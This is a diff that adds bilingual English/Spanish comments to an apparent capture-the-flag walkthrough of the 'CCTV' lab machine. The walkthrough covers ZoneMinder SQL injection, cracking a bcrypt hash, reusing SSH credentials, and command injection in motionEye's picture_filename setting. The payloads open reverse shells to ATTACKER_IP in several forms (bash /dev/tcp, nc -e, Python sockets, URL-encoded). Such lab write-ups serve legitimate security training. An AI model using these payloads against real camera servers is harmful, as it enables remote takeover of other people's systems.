@@ -50,11 +50,15 @@ Reverse Shell as root → Root Flag
 
 ### Host Setup
 ```bash
+# What it does: adds machine domains to /etc/hosts.
+# Why here: resolve virtual hosts during web enumeration.
 echo "TARGET_IP cctv.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Nmap Scan
 ```bash
+# What it does: runs an Nmap scan with the specified ports/scripts/options.
+# Why here: identify exposed services and decide on the next enumeration.
 nmap -sC -sV -p- TARGET_IP
 ```
 
@@ -71,6 +75,8 @@ Accessing `http://cctv.htb` reveals a web application. Further enumeration disco
 
 ```bash
 # Check for ZoneMinder
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl -s http://cctv.htb/zm/ | head -20
 ```
 
@@ -136,11 +142,15 @@ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=remove
 
 Save the `mark` hash to a file:
 ```bash
+# What it does: guarda material de hash en un archivo de cracking.
+# Why here: prepare the input that john/hashcat expect.
 echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > mark.hash
 ```
 
 **Crack with John the Ripper:**
 ```bash
+# What it does: crackea el hash indicado con la wordlist elegida.
+# Why here: recover reusable credentials.
 john mark.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
@@ -149,6 +159,8 @@ john mark.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ### Step 4 — SSH Access
 
 ```bash
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh mark@TARGET_IP
 # Password: opensesame
 ```
@@ -177,6 +189,8 @@ id
 # uid=1001(mark) gid=1001(mark) groups=1001(mark)
 
 # Check sudo permissions
+# What it does: lists sudo privileges of the current or specified user.
+# Why here: encontrar comandos permitidos para escalar privilegios.
 sudo -l
 # No sudo access for mark
 
@@ -187,6 +201,8 @@ ps aux
 ss -tlnp
 
 # Search for interesting files
+# What it does: searches the filesystem with the specified filters.
+# Why here: locate credentials, binaries, configs or writable paths.
 find / -type f -name "*.conf" -o -name "*.ini" -o -name "*.yml" 2>/dev/null | grep -v proc
 ```
 
@@ -194,6 +210,8 @@ find / -type f -name "*.conf" -o -name "*.ini" -o -name "*.yml" 2>/dev/null | gr
 
 ```bash
 # Check for motionEye configuration
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /etc/motioneye/motion.conf
 ```
 
@@ -213,7 +231,11 @@ cat /etc/motioneye/motion.conf
 ```bash
 # Check cron jobs
 crontab -l
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /etc/crontab
+# What it does: lists directory contents.
+# Why here: verificar archivos, permisos o loot en la ruta actual.
 ls -la /etc/cron.d/
 ```
 
@@ -245,6 +267,8 @@ A cron job or scheduled task transmits credentials over the network. We can capt
 ### SSH as sa_mark
 
 ```bash
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh sa_mark@TARGET_IP
 # Password: <captured_password>
 ```
@@ -282,6 +306,8 @@ The vulnerability operates through a **three-stage failure**:
 motionEye listens on `127.0.0.1:7999` — not accessible externally. Create an SSH tunnel:
 
 ```bash
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh -L 8765:127.0.0.1:7999 sa_mark@TARGET_IP
 ```
 
@@ -301,6 +327,8 @@ configUiValid = function() { return true; };
 
 ```bash
 # Enable picture output via API
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
 ```
 
@@ -310,11 +338,15 @@ The `picture_filename` parameter is vulnerable to command injection. Inject a re
 
 **1. Set up listener:**
 ```bash
+# What it does: opens or uses a TCP connection/listener.
+# Why here: receive shell, transfer data or check connectivity.
 nc -lvnp 4444
 ```
 
 **2. Craft and send the payload (URL-encoded):**
 ```bash
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')"
 ```
 
@@ -325,6 +357,8 @@ curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(bash -c 'bash -i >&
 
 **Alternative — URL-encoded version:**
 ```bash
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27%29"
 ```
 
@@ -334,6 +368,8 @@ The payload executes when motion detection triggers a picture capture:
 
 ```bash
 # Enable motion emulation to trigger the capture
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
 ```
 
@@ -380,6 +416,8 @@ fetch('/1/config/set?picture_filename=$(bash -c \'bash -i >& /dev/tcp/ATTACKER_I
 If filesystem access is available:
 ```bash
 # Edit motionEye camera config directly
+# What it does: imprime o escribe texto controlado.
+# Why here: crear la entrada o archivo pequeno necesario para el siguiente paso.
 echo "picture_filename $(bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')" >> /etc/motioneye/camera-0.conf
 
 # Restart motion to trigger execution
@@ -439,12 +477,18 @@ sqlmap -u "http://TARGET/zm/index.php?view=request&request=event&action=removeta
 
 ```bash
 # Save hash to file
+# What it does: guarda material de hash en un archivo de cracking.
+# Why here: prepare the input that john/hashcat expect.
 echo '$2y$10$HASH_VALUE' > hash.txt
 
 # Crack with John
+# What it does: crackea el hash indicado con la wordlist elegida.
+# Why here: recover reusable credentials.
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 # Crack with Hashcat (bcrypt mode 3200)
+# What it does: cracks hashes with the specified mode and wordlist.
+# Why here: recuperar credenciales o confirmar que no estan en la lista.
 hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -456,9 +500,13 @@ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 
 ```bash
 # SSH tunnel to motionEye
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh -L 8765:127.0.0.1:7999 USER@TARGET
 
 # Enable picture output
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl "http://127.0.0.1:7999/1/config/set?picture_output=on"
 
 # Inject reverse shell (picture_filename parameter)
@@ -472,11 +520,15 @@ curl "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
 
 **Netcat reverse shell:**
 ```bash
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(nc -e /bin/bash ATTACKER_IP PORT)"
 ```
 
 **Python reverse shell:**
 ```bash
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl "http://127.0.0.1:7999/1/config/set?picture_filename=\$(python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])')"
 ```
 
@@ -545,6 +597,8 @@ sqlmap -u "<URL>" --cookie="<COOKIE>" -p tid --dbms=mysql --batch --banner
 
 ```bash
 # Get current configuration
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl "http://127.0.0.1:7999/1/config/get"
 
 # Set configuration value
@@ -563,3 +617,5 @@ curl "http://127.0.0.1:7999/list"
 | `movie_file_name` | High — passed to shell |
 | `text_scale` | Medium — numeric context |
 | `snapshot_filename` | High — passed to shell |
+
+
